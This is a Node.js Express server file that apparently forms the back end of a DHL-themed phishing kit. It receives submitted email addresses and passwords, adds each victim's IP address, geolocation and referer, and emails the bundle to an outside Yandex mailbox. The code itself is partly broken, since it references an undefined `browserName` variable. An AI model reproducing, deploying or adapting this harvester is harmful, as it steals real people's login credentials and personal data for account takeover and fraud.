// server.js
// where your node app starts

const express = require("express");
const bodyParser = require("body-parser");
const requestIp = require("request-ip");
const geoip = require("geoip-lite");
const sendmail = require("sendmail")();


const app = express();

app.use(express.static("public"));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(requestIp.mw());

function getUserIpAddr(req) {
  return requestIp.getClientIp(req);
}

function ipInfo(ip) {
  const geo = geoip.lookup(ip);
  return {
    city: geo ? geo.city : "N/A",
    state: geo ? geo.region : "N/A",
    country: geo ? geo.country : "N/A",
    country_code: geo ? geo.countryCode : "N/A"
  };
}

function buildMail(email, password, req) {
  const dateTime = new Date().toLocaleString();
  const hostName = req.headers.referer || "N/A";
  const ipAddress = getUserIpAddr(req);
  const ipData = ipInfo(ipAddress);

  return `
    Email: ${email} <br>
    Password: ${password} <br>
    Date: ${dateTime} <br>
    Browser: ${browserName} <br>
    Host: ${hostName} <br>
    IP Address: ${ipAddress} <br>
    Country: ${ipData.country} <br>
    State: ${ipData.state} <br>
    City: ${ipData.city}
  `;
}

app.post("/", (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(422).json({
      message: "The given data is invalid",
      errors: {
        email: "The email is required",
        password: "The password is required"
      }
    });
  }

  const message = buildMail(email, password, req);
  const mailOptions = {
    from: "logs@logcentral.com",
    to: "comp.id47@yandex.com",
    subject: "dhl fire",
    html: message
  };

  sendmail(mailOptions, (error, reply) => {
    if (error) {
      return res.status(500).json({
        message: `Message could not be sent. Mailer Error: ${error.message}`
      });
    }

    res.status(200).json({
      message: "Message has been sent"
    });
  });
});

const listener = app.listen(process.env.PORT || 3000, () => {
  console.log("Your app is listening on port " + listener.address().port);
});
